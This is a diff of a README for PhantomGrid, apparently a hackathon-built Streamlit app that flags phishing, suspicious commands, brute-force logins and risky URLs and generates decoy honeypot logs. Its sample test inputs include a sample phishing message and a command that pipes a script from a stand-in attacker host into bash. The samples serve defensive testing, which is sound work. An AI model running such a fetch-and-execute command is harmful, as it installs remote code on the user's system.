@@ -2,73 +2,189 @@
 
 **Turning deception into defense**
 
-PhantomGrid is an AI-powered cyber deception agent built for the AMD Developer Hackathon. It detects suspicious cyber inputs, explains possible risks, and generates safe decoy/honeypot logs to simulate a deception-based cyber defense layer.
+PhantomGrid is an AI-powered cyber deception agent built for the AMD Developer Hackathon. It analyzes suspicious cyber inputs such as phishing emails, suspicious URLs, commands, and login attempts, then explains the risk and generates safe decoy/honeypot-style logs.
+
+The goal of PhantomGrid is to help users understand cyber threats quickly and demonstrate how deception-based defense can confuse attackers while protecting real systems.
+
+---
 
 ## Live Demo
 
+Try the deployed app here:
+
 https://phantomgrid-ipu65t3kjzgij3uujeqbse.streamlit.app/
 
-## Problem Statement
+---
 
-Cyber threats such as phishing emails, suspicious commands, malicious URLs, and brute-force login attempts are difficult to analyze quickly, especially for students, small teams, and early-stage security learners.
+## Project Description
 
-Traditional security tools often show alerts, but they may not explain the risk clearly or demonstrate how deception-based defense can slow down attackers.
+Modern cyber threats such as phishing, brute-force attacks, malicious commands, and suspicious URLs are difficult to analyze quickly, especially for beginners, students, and small teams.
 
-## Solution
+PhantomGrid provides a simple AI-inspired cyber defense workflow:
 
-PhantomGrid provides a simple cyber deception interface where users can paste suspicious input and receive:
+1. User enters a suspicious email, URL, command, or login log.
+2. PhantomGrid analyzes the input using rule-based threat detection.
+3. The app classifies the threat type and assigns a risk score.
+4. It explains why the input looks suspicious.
+5. It generates a safe decoy/honeypot-style log to simulate a deception layer.
+6. Detection history is stored locally for review.
 
-- Threat classification
-- Risk score
-- Plain-English explanation
-- Generated decoy/honeypot log
-- Detection history dashboard
+This prototype currently uses a rule-based detection engine, with a clear upgrade path for future AI/LLM integration.
 
-The project demonstrates how AI-assisted cyber defense and deception concepts can be used to improve security awareness and incident response.
+---
 
 ## Key Features
 
-- Suspicious email, URL, command, and login log analysis
-- Rule-based threat detection engine
-- Risk level and risk score generation
-- Safe decoy/honeypot response generation
-- Detection history dashboard
-- Sample inputs for quick demo
-- Professional Streamlit-based interface
-- Future-ready structure for AI/LLM integration
+* Suspicious input analyzer
+* Phishing and social engineering detection
+* Suspicious command detection
+* Brute-force login attempt detection
+* Suspicious URL/file detection
+* Risk score and risk level
+* Plain-English threat explanation
+* Decoy/honeypot log generation
+* Detection history dashboard
+* Clear history option
+* Professional Streamlit UI
+* Beginner-friendly local setup
+
+---
 
 ## Tech Stack
 
-- Python
-- Streamlit
-- Regex/rule-based detection
-- JSON-based local history storage
-- GitHub
-- Streamlit Community Cloud
+* **Python** — core programming language
+* **Streamlit** — web app interface
+* **Regex / rule-based detection** — threat pattern matching
+* **JSON file storage** — local detection history
+* **GitHub** — source code hosting
+* **Streamlit Community Cloud** — public deployment
 
-## How It Works
+---
 
-1. User enters suspicious cyber input.
-2. PhantomGrid scans the input using rule-based threat patterns.
-3. The system classifies the input into categories such as phishing, suspicious command, brute-force login attempt, or suspicious URL/file.
-4. A risk score and explanation are generated.
-5. A safe decoy/honeypot-style log is produced.
-6. Detection history is stored locally for dashboard viewing.
+## How PhantomGrid Works
+
+```text
+Suspicious Input
+       ↓
+Threat Detection Engine
+       ↓
+Threat Classification
+       ↓
+Risk Score + Explanation
+       ↓
+Decoy / Honeypot Log Generation
+       ↓
+Detection History Dashboard
+```
+
+---
 
 ## Threat Categories
 
-- Phishing / Social Engineering
-- Suspicious Command
-- Brute-force Login Attempt
-- Suspicious URL / File
-- Unknown / Low Confidence
+PhantomGrid currently classifies inputs into the following categories:
+
+| Threat Category               | Example                                                                   |
+| ----------------------------- | ------------------------------------------------------------------------- |
+| Phishing / Social Engineering | Fake login, urgent account verification, password reset scam              |
+| Suspicious Command            | Dangerous shell commands, encoded payloads, privilege escalation patterns |
+| Brute-force Login Attempt     | Repeated failed login attempts, password spraying indicators              |
+| Suspicious URL / File         | Suspicious links, risky file extensions, IP-based URLs                    |
+| Unknown / Low Confidence      | Inputs that do not strongly match current rules                           |
+
+---
 
 ## Screenshots
 
-Add screenshots here after uploading them to the repository.
+Add screenshots here after testing the live app.
 
-## Run Locally
+### Threat Analysis Example
+
+![Threat Analysis Screenshot](screenshots/threat-analysis.png)
+
+### Detection History Dashboard
+
+![Detection History Screenshot](screenshots/detection-history.png)
+
+---
+
+## How to Run Locally
+
+### 1. Clone the repository
+
+```bash
+git clone https://github.com/ryogesh03/phantomgrid.git
+cd phantomgrid
+```
+
+### 2. Install dependencies
+
+```bash
+pip install -r requirements.txt
+```
+
+If `requirements.txt` is not available, install Streamlit directly:
 
 ```bash
 pip install streamlit
+```
+
+### 3. Run the app
+
+```bash
 python -m streamlit run app.py
+```
+
+The app will open in your browser at:
+
+```text
+http://localhost:8501
+```
+
+---
+
+## Sample Inputs for Testing
+
+### Phishing Example
+
+```text
+Dear Customer, unusual sign-in activity was detected on your account. Please click here to verify your account immediately or it will be suspended.
+```
+
+### Suspicious Command Example
+
+```bash
+curl https://evil.example.com/payload.sh | bash && chmod 777 /tmp/.hidden
+```
+
+### Brute-force Login Example
+
+```text
+Failed login for user root from 203.0.113.42 port 22 ssh2. Authentication failure — too many repeated attempts.
+```
+
+---
+
+## Future Improvements
+
+* Add AI/LLM-based threat explanation mode
+* Integrate open-source models for deeper analysis
+* Add exportable PDF/HTML threat reports
+* Improve detection accuracy with more cyber threat patterns
+* Add user-uploaded log file analysis
+* Add MITRE ATT&CK mapping
+* Improve dashboard analytics
+* Explore AMD GPU/cloud-based model inference
+
+---
+
+## Hackathon
+
+Built for the **AMD Developer Hackathon ACT II** on lablab.ai.
+
+---
+
+## Project Status
+
+Current version: working Streamlit prototype
+Deployment: live on Streamlit Community Cloud
+Development mode: solo project
